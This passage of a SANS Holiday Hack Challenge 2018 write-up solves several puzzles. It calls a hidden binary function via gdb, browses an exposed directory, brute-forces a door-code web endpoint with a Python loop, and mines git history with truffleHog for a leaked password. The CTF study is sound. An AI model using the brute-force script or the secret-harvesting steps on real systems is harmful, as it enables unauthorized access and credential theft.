00000000000015b0 T __libc_csu_init
0000000000001624 T _fini
00000000000008c8 T _init
0000000000000a00 T _start
0000000000000c1e T base64_cleanup
0000000000000c43 T base64_decode
0000000000000bcc T build_decoding_table
0000000000000b0a T hmac_sha256
00000000000014ca T main
00000000000014b7 T sorry
0000000000000f18 T tohex
0000000000000fd7 T winnerwinner    
</pre>
</div>

<p>
<code>winnerwinner</code> looks promising. Let's see if we can use <code>gdb</code> to call that:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@unlinked-function:~$ gdb -q ./sleighbell-lotto
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) <span style="color: #a020f0;">break</span> main
Breakpoint 1 at 0x14ce
(gdb) run
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library <span style="color: #8b2252;">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
Breakpoint 1, 0x00005555555554ce<span style="color: #a020f0;"> in</span> main ()
(gdb) jump winnerwinner
Continuing at 0x555555554fdb.

                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .<span style="color: #8b2252;">';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    </span>
<span style="color: #8b2252;">                         '</span>:okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                <span style="color: #8b2252;">'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    </span>
<span style="color: #8b2252;">              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'</span>                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx<span style="color: #8b2252;">'                         </span>
<span style="color: #8b2252;">           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'</span>                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,<span style="color: #8b2252;">',,:lxkkkkkkkkkkkkkd.                                  </span>
<span style="color: #8b2252;">     ..........................'</span>;;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       
With gdb you fixed the race.
The other elves we did out-pace.
  And now they<span style="color: #8b2252;">'ll see.</span>
<span style="color: #8b2252;">  They'</span>ll all watch me.
I<span style="color: #8b2252;">'ll hang the bells on Santa'</span>s sleigh!


Congratulations! You<span style="color: #8b2252;">'ve won, and have successfully completed this challenge.</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org2ab6949" class="outline-4">
<h4 id="org2ab6949">Summary</h4>
<div class="outline-text-4" id="text-org2ab6949">
<p>
For this one, we followed the SANS blog post from our badge hint
almost verbatim, and were able to directly call the <code>winnerwinner</code>
function.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org11d8f80" class="outline-2">
<h2 id="org11d8f80">Objectives</h2>
<div class="outline-text-2" id="text-org11d8f80">
</div>
<div id="outline-container-org2c669fd" class="outline-3">
<h3 id="obj1"><a id="org2c669fd"></a>Orientation Challenge</h3>
<div class="outline-text-3" id="text-obj1">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgd9bfccd">Goal</a></li>
<li><a href="#orgc41fac9">Background</a></li>
<li><a href="#orgc698f58">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgd9bfccd" class="outline-4">
<h4 id="orgd9bfccd">Goal</h4>
<div class="outline-text-4" id="text-orgd9bfccd">
<div class="note">
<p>
What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle?
</p>

</div>
</div>
</div>
<div id="outline-container-orgc41fac9" class="outline-4">
<h4 id="orgc41fac9">Background</h4>
<div class="outline-text-4" id="text-orgc41fac9">
</div>
<ul class="org-ul">
<li><a id="org1986ff1"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-org1986ff1">
<div class="tip">
<p>
For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="org300cbed"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org300cbed">
<p>
Once we solve the Essential Editor Skills challenge, Bushy tells us to check out <a href="https://holidayhackchallenge.com/past-challenges/">Past Holiday Hack Challenges</a>.
</p>
</div>
</li>
<li><a id="orgb752b08"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgb752b08">
<p>
<a href="https://www.youtube.com/watch?v=31JsKzsbFUo">Ed Skoudis, KringleCon 2018: Start Here</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgc698f58" class="outline-4">
<h4 id="orgc698f58">Solution</h4>
<div class="outline-text-4" id="text-orgc698f58">
<ol class="org-ol">
<li><p>
START HERE
</p>

<p>
To get into the Lobby, we <del>have to</del>, erm&#x2026; get to talk to Santa, who is
inside the gates. As we talk to him, he points us to a video we
should start with:
</p>


<div class="figure">
<p><img src="./imgs/obj1_start_here.png" alt="obj1_start_here.png" width="500px" />
</p>
<p><span class="figure-number">Figure 15: </span>Santa Says START HERE</p>
</div>

<p>
As we watch that video, Ed Skoudis tells us the following things, which answer our questions:
</p>

<ol class="org-ol">
<li><p>
In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?
</p>

<p>
At 4 minutes, 29 seconds:
</p>
<blockquote>
<p>
&#x2026;and they extracted <span class="underline">THE FIRMWARE</span>. They extracted the
firmware from their Gnome in their Home and then they did some
analysis on it.
</p>
</blockquote></li>

<li><p>
In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?
</p>

<p>
At 4:52:
</p>
<blockquote>
<p>
And it turns out that the company that sold the gnomes was called <span class="underline">ATNAS</span> Corporation, A-T-N-A-S.
</p>
</blockquote></li>

<li><p>
In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?
</p>

<p>
At 9:03:
</p>
<blockquote>
<p>
So that's Santa's Business Card. The whole thing starts with
the <span class="underline">BUSINESS CARD</span>. Because that's all that's left among
all of the needles that are dropped from the tree right next
to Santa's bag. Is that Santa's business card.
</p>
</blockquote></li>

<li><p>
In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?
</p>

<p>
At 16:26:
</p>
<blockquote>
<p>
Another <i>really</i> big hint for you is that Santa's elves
provide hints, but you first need to solve some terminal
challenges. So, the concept here is you go up to a terminal
challenge, it's just a simple little <span class="underline">CRANBERRY PI</span>
terminal. Wherever you see a cranberry pi on a terminal,
click on that thing.
</p>
</blockquote></li>

<li><p>
In 2017, the North Pole was being bombarded by giant objects. What were they?
</p>

<p>
At 9:19:
</p>
<blockquote>
<p>
In 2017, the Holiday Hack Challenge opens up with <span class="underline">GIANT SNOWBALLS</span> pouring down the mountain of the North Pole.
</p>
</blockquote></li>

<li><p>
In 2017, Sam the snowman needed help reassembling pages torn from what?
</p>

<p>
At 9:54:
</p>
<blockquote>
<p>
You see, <span class="underline">THE GREAT BOOK</span> is this wonderful book that was
shredded by an inter-dimensional tornado, and you have to
fetch different pages of this book.
</p>
</blockquote></li>
</ol>

<p>
Once we enter the correct answers, the screen changes:
</p>


<div class="figure">
<p><img src="./imgs/obj1_answers.png" alt="obj1_answers.png" width="500px" />
</p>
<p><span class="figure-number">Figure 16: </span>Kringle History Kiosk Answer</p>
</div>

<div class="note">
<p>
Happy Trails
</p>

</div></li>

<li><p>
Open-Source Intel
</p>

<p>
One of the coolest things about the Holiday Hack is that old
versions remain up! Using the link that Bushy gave us, we can try
past challenges, and read the official solutions and other winning
entries.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Year</th>
<th scope="col" class="org-left">Challenge</th>
<th scope="col" class="org-left">Winning Entries</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">2017</td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2017/">Challenge</a></td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2017/winners_answers.html">Answers</a></td>
</tr>

<tr>
<td class="org-right">2016</td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2016/">Challenge</a></td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2016/winners_answers.html">Answers</a></td>
</tr>

<tr>
<td class="org-right">2015</td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2015/">Challenge</a></td>
<td class="org-left"><a href="https://www.holidayhackchallenge.com/2015/winning-entry.html">Answers</a></td>
</tr>
</tbody>
</table>

<ol class="org-ol">
<li><p>
In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?
</p>

<p>
From reading the 2015 Challenge, we see:
</p>

<blockquote>
<p>
Now, Dear Reader, please help Jessica unwrap the secrets of the
Gnome’s firmware by returning once again to the Dosis
neighborhood.  Find Jessica and she will provide you a copy of
the Gnome’s firmware.
</p>
</blockquote>

<p>
Answer: <b>Firmware</b>
</p></li>

<li><p>
In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?
</p>

<p>
From the 2015 Answers:
</p>

<blockquote>
<p>
Through the fine investigative work of over 500 officers and
detectives here in this room, I am proud to announce that we
have apprehended the mastermind behind the co-called “Gnome in
Your Home” conspiracy.  Miss Cindy Lou Who, age sixty-two, CEO
of ATNAS Corporation, had planned a worldwide crime spree to
destroy Christmas joy.
</p>
</blockquote>

<p>
Answer: <b>ATNAS</b>
</p></li>

<li><p>
In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?
</p>

<p>
2016 was called "Santa's Business Card," so that's a good guess. Reading the 2016 challenge:
</p>

<blockquote>
<p>
And that, Dear Reader, is where you get involved. Take a close
look at Santa's Business card.
</p>
</blockquote>

<p>
Answer: <b>Business card</b>
</p></li>

<li><p>
In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?
</p>

<p>
Searching the 2016 challenge:
</p>

<blockquote>
<p>
Now, Dear Reader, scurry around the North Pole and retrieve all
of the computer parts to build yourself a Cranberry Pi.
</p>
</blockquote>

<p>
Answer: <b>Cranberry Pi</b>
</p></li>

<li><p>
In 2017, the North Pole was being bombarded by giant objects. What were they?
</p>

<p>
The 2017 challenge starts:
</p>

<blockquote>
<p>
If I live to be a hundred, I'll never be able to forget the
giant snowball disaster going on right now! The North Pole
itself is under siege as boulder-sized snowballs cascade down
our mountain, leaving destruction and mayhem in their wake.
</p>
</blockquote>

<p>
Answer: <b>Snowballs</b>
</p></li>

<li><p>
In 2017, Sam the snowman needed help reassembling pages torn from what?
</p>

<p>
Reading further:
</p>

<blockquote>
<p>
And if the snowballs aren't bad enough, the North Pole was hit
last week with the worst Inter-Dimensional Tornado ever known,
scrambling things up here pretty badly. Why, that blasted
tornado even shredded The Great Book!
</p>

<p>
What's that? You haven't heard of The Great Book? Why, it's a
wonderful tome that describes the epic history of the elves. I gotta
tell you, they revere that book, but now its pages are scattered all
over the place! We need your help to find the missing seven pages of
The Great Book so we can stitch this priceless relic back together.
</p>
</blockquote>

<p>
Answer: <b>The Great Book</b>
</p></li>
</ol></li>
</ol>
</div>
</div>
</div>

<div id="outline-container-orgfefced1" class="outline-3">
<h3 id="obj2"><a id="orgfefced1"></a>Directory Browsing</h3>
<div class="outline-text-3" id="text-obj2">
<div id="text-table-of-contents">
<ul>
<li><a href="#org3824d9c">Goal</a></li>
<li><a href="#org63a266a">Background</a></li>
<li><a href="#orgc99142e">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-org3824d9c" class="outline-4">
<h4 id="org3824d9c">Goal</h4>
<div class="outline-text-4" id="text-org3824d9c">
<div class="note">
<p>
Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? <a href="https://cfp.kringlecastle.com/">Please analyze the CFP site to find out</a>.
</p>

</div>
</div>
</div>
<div id="outline-container-org63a266a" class="outline-4">
<h4 id="org63a266a">Background</h4>
<div class="outline-text-4" id="text-org63a266a">
</div>
<ul class="org-ul">
<li><a id="org48b1002"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-org48b1002">
<div class="tip">
<p>
For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="orga4e3082"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orga4e3082">
<p>
Once we solve the Name Game challenge, Minty tells us:
</p>

<blockquote>
<p>
Finding Browsable Directories: On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL.
</p>

<p>
Website Directory Browsing: <a href="https://portswigger.net/kb/issues/00600100_directory-listing">Website Directory Browsing</a>
</p>
</blockquote>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgc99142e" class="outline-4">
<h4 id="orgc99142e">Solution</h4>
<div class="outline-text-4" id="text-orgc99142e">
<p>
As we interact with the website, we're told that we missed the Call for Papers for the conference! We also see that there are two webpages we can access:
</p>

<p>
<a href="https://cfp.kringlecastle.com/">https://cfp.kringlecastle.com/</a>
<a href="https://cfp.kringlecastle.com/cfp/cfp.html">https://cfp.kringlecastle.com/cfp/cfp.html</a>
</p>

<p>
The hints tell us to remove some characters from the end of the
URL, as to view a directory listing. We discover that
<a href="https://cfp.kringlecastle.com/cfp/">https://cfp.kringlecastle.com/cfp/</a> has directory listings enabled, and we see another file in that directory:
</p>


<div class="figure">
<p><img src="./imgs/obj2_listing.png" alt="obj2_listing.png" width="750px" />
</p>
<p><span class="figure-number">Figure 17: </span>Directory Listing</p>
</div>

<p>
At this point, we just need to find the line with the talk we're looking for:
</p>


<div class="figure">
<p><img src="./imgs/obj2_answer.png" alt="obj2_answer.png" />
</p>
<p><span class="figure-number">Figure 18: </span>A Path in the Darkness?</p>
</div>

<div class="note">
<p>
John McClane
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-orgb26c3d5" class="outline-3">
<h3 id="obj3"><a id="orgb26c3d5"></a>de Bruijn Sequences</h3>
<div class="outline-text-3" id="text-obj3">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgf1ca806">Goal</a></li>
<li><a href="#orgb3a4c6a">Background</a></li>
<li><a href="#orga7fb0e8">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgf1ca806" class="outline-4">
<h4 id="orgf1ca806">Goal</h4>
<div class="outline-text-4" id="text-orgf1ca806">
<div class="note">
<p>
When you break into the speaker unpreparedness room, what does Morcel Nougat say?
</p>

</div>
</div>
</div>
<div id="outline-container-orgb3a4c6a" class="outline-4">
<h4 id="orgb3a4c6a">Background</h4>
<div class="outline-text-4" id="text-orgb3a4c6a">
</div>
<ul class="org-ul">
<li><a id="org930dd9d"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-org930dd9d">
<div class="tip">
<p>
For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="org3d2aca3"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org3d2aca3">
<p>
Once we solve the ForensicELFication challenge, Tangle gives us the following hints:
#+BEGIN_QUOTE
Hey, thanks for the help with the investigation, gumshoe.  Have
you been able to solve the lock with the funny shapes?  It reminds
me of something called "de Bruijn Sequences."  You can optimize
the guesses because there is no start and stop &#x2013; each new value
is added to the end and the first is removed.
</p>
</div>
</li>
<li><a id="orgd001815"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orgd001815">
<p>
Opening a Ford Lock Code: <a href="https://hackaday.com/2018/06/18/opening-a-ford-with-a-robot-and-the-de-bruijn-sequence/">Opening a Ford with a Robot and the de Bruijn Sequence</a>
</p>

<p>
de Bruijn Sequence Generator: <a href="http://www.hakank.org/comb/debruijn.cgi">de Bruijn sequence generator</a>
#+END_QUOTE
</p>

<p>
As an aside, one of the authors of this report finds this upsetting given they own a Ford vehicle with one of those keypads&#x2026; The other two are fine with it.
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orga7fb0e8" class="outline-4">
<h4 id="orga7fb0e8">Solution</h4>
<div class="outline-text-4" id="text-orga7fb0e8">
<ol class="org-ol">
<li><p>
de Bruijn Sequences
</p>

<p>
The key point from Tangle Coalbox is the bit about there being
no start and stop. The door passcode is checked for each
sequence of shapes as they are entered and shift from right to
left. After the first four shapes are entered, a new passcode
can be checked by entering just one more shape and for each
shape after that.
</p>

<p>
A de Bruijn algorithm generates a sequence of characters from a
given "alphabet" (\(k\)) and "length" (\(n\)) where each
sub-sequence only appears once. For this challenge, we simply
convert each shape to a number 0-3, and run it through a de Bruijn
algorithm.
</p>

<p>
Doing so greatly speeds up the number of buttons we would need to
press if we were entering this by hand. Brute-forcing this
would mean that we would need to hit up to \(256 x 4 = 1024\)
buttons. However, the de Bruijn sequence is only of length 259
(it wraps around, as the last digit could be followed by the
first 3 digits of the sequence).
</p>

<p>
Using the <a href="http://www.hakank.org/comb/debruijn.cgi">de Bruijn sequence generator</a> provided in the hint
from Tangle, we generate a sequence of 4 possibilities
(\(k=4\)) and of length 4 (\(n=4\)). This generates the
following sequence:
</p>

<pre class="example">
0000100020003001100120013002100220023003100320033010102010301110
1120113012101220123013101320133020203021102120213022102220223023
1023202330303110312031303210322032303310332033311112111311221123
1132113312121312221223123212331313221323133213332222322332323333
</pre>

<p>
We then simply try the possibilities, and quickly find our answer:
</p>


<div class="figure">
<p><img src="./imgs/obj3_de_bruijn.gif" alt="obj3_de_bruijn.gif" />
</p>
<p><span class="figure-number">Figure 19: </span>de Bruijn sequences on the Door Lock</p>
</div></li>

<li><p>
Brute Force
</p>

<p>
By using the Developer Tools <code>Network</code> tab, we can see what's going on behind the scenes as we try a few codes in our browser:
</p>


<div class="figure">
<p><img src="./imgs/obj3_get_requests.png" alt="obj3_get_requests.png" width="750px" />
</p>
<p><span class="figure-number">Figure 20: </span>Door Lock HTTP GET requests</p>
</div>

<p>
Chrome's Developer Tools have a handy feature of copying the request as a curl command. After we press square, circle, triangle, square, our network request looks something like the following in curl:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl <span style="color: #8b2252;">'https://doorpasscode.kringlecastle.com/checkpass.php?i=1201&amp;resourceId=92b948c2-882e-4dca-b5bc-8a15badd13e5'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Pragma: no-cache'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Accept-Encoding: gzip, deflate, br'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Accept-Language: en-US,en;q=0.9'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Accept: */*'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Referer: https://doorpasscode.kringlecastle.com/?challenge=doorpasscode&amp;id=92b948c2-882e-4dca-b5bc-8a15badd13e5'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Connection: keep-alive'</span> <span style="color: #8b2252;">\</span>
   -H <span style="color: #8b2252;">'Cache-Control: no-cache'</span> <span style="color: #8b2252;">\</span>
   --compressed
</pre>
</div>

<p>
This command outputs: <code>{"success":false,"message":"Incorrect guess."}</code>.
</p>

<p>
We see that the first line includes the URL, and most of the other lines are headers that Chrome was setting.
</p>

<p>
To figure out the right code, we can just replace the <code>i</code>
parameter in the URL, and loop over all \(4^4 = 256\)
options. There's no real benefit to calculating and using a de
Bruijn sequence here, as each command will send a complete
4-character combination.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python3</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Brute force the door code. Finds the solution in 25 tries.</span>

<span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">import</span> itertools

<span style="color: #b22222;"># </span><span style="color: #b22222;">The values sent to the server for each symbol</span>
<span style="color: #a0522d;">symbols</span> = {0: <span style="color: #8b2252;">'&lt;TRIANGLE&gt;'</span>, 1: <span style="color: #8b2252;">'&lt;SQUARE&gt;'</span>, 2: <span style="color: #8b2252;">'&lt;CIRCLE&gt;'</span>, 3: <span style="color: #8b2252;">'&lt;STAR&gt;'</span>}
<span style="color: #a0522d;">search_space</span> = itertools.product(<span style="color: #483d8b;">list</span>(symbols), repeat=4)

<span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> search_space:
    <span style="color: #a0522d;">result</span> = requests.get(<span style="color: #8b2252;">'https://doorpasscode.kringlecastle.com/checkpass.php?i=%i%i%i%i&amp;resourceId=undefined'</span> % i)
    <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">"true"</span> <span style="color: #a020f0;">in</span> result.text:
        <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"Code is "</span>, end=<span style="color: #8b2252;">''</span>)
        <span style="color: #a020f0;">for</span> symbol <span style="color: #a020f0;">in</span> i:
            <span style="color: #a020f0;">print</span>(symbols[symbol], end=<span style="color: #8b2252;">''</span>)
        <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">" (%i%i%i%i)"</span> % i)
        <span style="color: #008b8b;">exit</span>(1)
</pre>
</div>

<p>
After a few seconds, we get our solution: 
</p>

<pre class="example">
Code is &lt;TRIANGLE&gt;&lt;SQUARE&gt;&lt;CIRCLE&gt;&lt;TRIANGLE&gt; (0120)
</pre>

<p>
Interestingly and somewhat expected, the straight brute force code worked on the 25th try, which was slower than de Bruijn solution.
</p></li>
</ol>

<div class="note">
<p>
\(\triangle \square \bigcirc \triangle \)
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org92144a4" class="outline-3">
<h3 id="obj4"><a id="org92144a4"></a>Data Repo Analysis</h3>
<div class="outline-text-3" id="text-obj4">
<div id="text-table-of-contents">
<ul>
<li><a href="#org9ee01a5">Goal</a></li>
<li><a href="#org4364557">Background</a></li>
<li><a href="#orgcea208b">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-org9ee01a5" class="outline-4">
<h4 id="org9ee01a5">Goal</h4>
<div class="outline-text-4" id="text-org9ee01a5">
<div class="note">
<p>
Retrieve the encrypted ZIP file from the <a href="https://git.kringlecastle.com/Upatree/santas_castle_automation">North Pole Git repository</a>. What is the password to open this file?
</p>

</div>
</div>
</div>
<div id="outline-container-org4364557" class="outline-4">
<h4 id="org4364557">Background</h4>
<div class="outline-text-4" id="text-org4364557">
</div>
<ul class="org-ul">
<li><a id="orgf4ce4c5"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-orgf4ce4c5">
<div class="tip">
<p>
For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="org07cb6a1"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org07cb6a1">
<p>
We visit Wunorse, who tells us:
</p>

<blockquote>
<p>
Brian Hostetler is giving a great <a href="https://github.com/dxa4481/truffleHog">Trufflehog</a> talk upstairs.
</p>
</blockquote>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgcea208b" class="outline-4">
<h4 id="orgcea208b">Solution</h4>
<div class="outline-text-4" id="text-orgcea208b">
<p>
When we pull up the Git repository, we find a project called
"santas_castle_automation." Our first hurdle is retrieving the
encrypted ZIP file. The GitLab site has a "Find File" button on
the right side of the page. Searching for <code>zip</code> yields:
</p>


<div class="figure">
<p><img src="./imgs/obj4_zip_search.png" alt="obj4_zip_search.png" width="500px" />
</p>
<p><span class="figure-number">Figure 21: </span>zip paths in santas_castle_automation GitLab</p>
</div>

<p>
<code>ventilation_diagram.zip</code> catches our attention, so we download
that from the website. Is this the encrypted ZIP file which we
seek? Trying to open it prompts us for a password, so it seems
likely that we've found it. Viewing the history and the commit
where this file was added also reveals the following comment:
</p>


<div class="figure">
<p><img src="./imgs/obj4_password_comment.png" alt="obj4_password_comment.png" width="750px" />
</p>
<p><span class="figure-number">Figure 22: </span>Shinny's comment on ventilation_diagram.zip</p>
</div>

<p>
As we skim over the README that's displayed as we scroll down, we
see the following message from Shinny:
</p>

<p class="verse">
We all get what we git, then we git what we've got.<br />
When we're full of old pulls, then we're holding a lot.<br />
Do you wonder what happens to things that we thought,<br />
Were too private then trampled with things that were not?<br />
<br />
I assume that our secrets are gone from the cloud.<br />
They still sit here in local reposit'ries' shroud,<br />
But I heard that old Redberry was rather wowed,<br />
When she found out her keys were exposed - wasn't proud.<br />
<br />
So when I found that I had thown creds with a push,<br />
Pretty sure I did stomp them with clean files - smoosh!<br />
If you find an old password 'neath folder or bush,<br />
Would you kindly play nice and say nothing - just shush?"<br />
</p>

<p>
This, combined with the hint, strongly suggest that there are some
secrets hidden in this repository. We've never tried Trufflehog
before. Following along in Brian's video, we can try the command
from the <a href="https://github.com/dxa4481/truffleHog#new">Trufflehog's README</a>.
</p>

<pre class="example">
$ pip install truffleHog
Collecting truffleHog
  Downloading https://files.pythonhosted.org/packages/6a/30/efbdeb399c543b052c31c05fa7dab78cd6d02d26934c087b83adb1b83c93/truffleHog-2.0.98-py2.py3-none-any.whl
Requirement already satisfied: GitPython==2.1.1 in /usr/local/lib/python2.7/site-packages (from truffleHog) (2.1.1)
Requirement already satisfied: truffleHogRegexes==0.0.7 in /usr/local/lib/python2.7/site-packages (from truffleHog) (0.0.7)
Requirement already satisfied: gitdb2&gt;=2.0.0 in /usr/local/lib/python2.7/site-packages (from GitPython==2.1.1-&gt;truffleHog) (2.0.5)
Requirement already satisfied: smmap2&gt;=2.0.0 in /usr/local/lib/python2.7/site-packages (from gitdb2&gt;=2.0.0-&gt;GitPython==2.1.1-&gt;truffleHog) (2.0.5)
Installing collected packages: truffleHog
Successfully installed truffleHog-2.0.98
$ truffleHog --regex --entropy=False https://git.kringlecastle.com/Upatree/santas_castle_automation.git
~~~~~~~~~~~~~~~~~~~~~
Reason: RSA private key
Date: 2018-12-11 02:29:03
Hash: 6e754d3b0746a8e980512d010fc253cbb7c23f52
Filepath: schematics/files/dot/ssh/key.rsa
Branch: origin/master
Commit: cleaning files
-----BEGIN RSA PRIVATE KEY-----
~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~
Reason: RSA private key
Date: 2018-12-11 01:25:21
Hash: c376f995b44caf502992ddb617a34e7d38d7bbc1
Filepath: schematics/files/dot/ssh/key.rsa
Branch: origin/master
Commit: support files for Santa's drone functions

-----BEGIN RSA PRIVATE KEY-----
~~~~~~~~~~~~~~~~~~~~~
</pre>

<p>
Interesting&#x2026; some private SSH keys. The top commit catches our
eye, as the message is "cleaning files." Could this be what Shinny
was talking about, when he said "<i>So when I found that I had thown creds with a push, Pretty sure I did stomp them with clean files - smoosh!</i>?"
</p>

<p>
No passwords, though. The video continues to mention the second
command from the README, so let's try that. The README states that
the first command we ran cuts down on the noise, but as we haven't
found the password yet, we'll expand the search:
</p>

<pre class="example">
$ truffleHog https://git.kringlecastle.com/Upatree/santas_castle_automation.git
...
Reason: High Entropy
Date: 2018-12-11 01:16:57
Hash: 0dfdc124b43a4e7e1233599c429c0328ec8b01ef
Filepath: schematics/for_elf_eyes_only.md
Branch: origin/master
Commit: important update

@@ -1,15 +0,0 @@
-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, 
-Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
-
-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing 
- he caught it before those dastardly villians did!
-
-
-Hopefully this is the last time we have to change our password again until next Christmas.
-
-
-
-
-Password = 'Yippee-ki-yay'
-
-
-Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
-

~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~
Reason: High Entropy
Date: 2018-12-11 01:14:41
Hash: c61af60810e77c8b91c8d29c1303da4bfefde66b
Filepath: sysctl/metadata.json
Branch: origin/master
Commit: Santa's Castle ICS
...
</pre>

<p>
This finds <i>a lot</i> of hits, but the second from the last commit catches our eye. The filepath is <code>schematics/for_elf_eyes_only.md</code>, and there's a line:
</p>

<pre class="example">
Password = 'Yippee-ki-yay'
</pre>

<p>
Trying to open the ZIP file again, we enter that password and discover maps of the ventilation system!
</p>

<div class="note">
<p>
Yippee-ki-yay
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-orgf27bc3d" class="outline-3">
<h3 id="obj5"><a id="orgf27bc3d"></a>AD Privilege Discovery</h3>
<div class="outline-text-3" id="text-obj5">
<div id="text-table-of-contents">
<ul>
<li><a href="#org9df0bc6">Goal</a></li>
<li><a href="#org1d18a71">Background</a></li>
<li><a href="#org66b19df">Solution</a></li>
</ul>
</div>
</div>
<div id="outline-container-org9df0bc6" class="outline-4">
<h4 id="org9df0bc6">Goal</h4>
<div class="outline-text-4" id="text-org9df0bc6">
<div class="note">
<p>
Using the data set contained in this <a href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">SANS Slingshot Linux image</a>,
find a reliable path from a Kerberoastable user to the Domain
Admins group. What’s the user’s logon name? Remember to avoid RDP
as a control path as it depends on separate local privilege
escalation flaws.
</p>

</div>
</div>
</div>
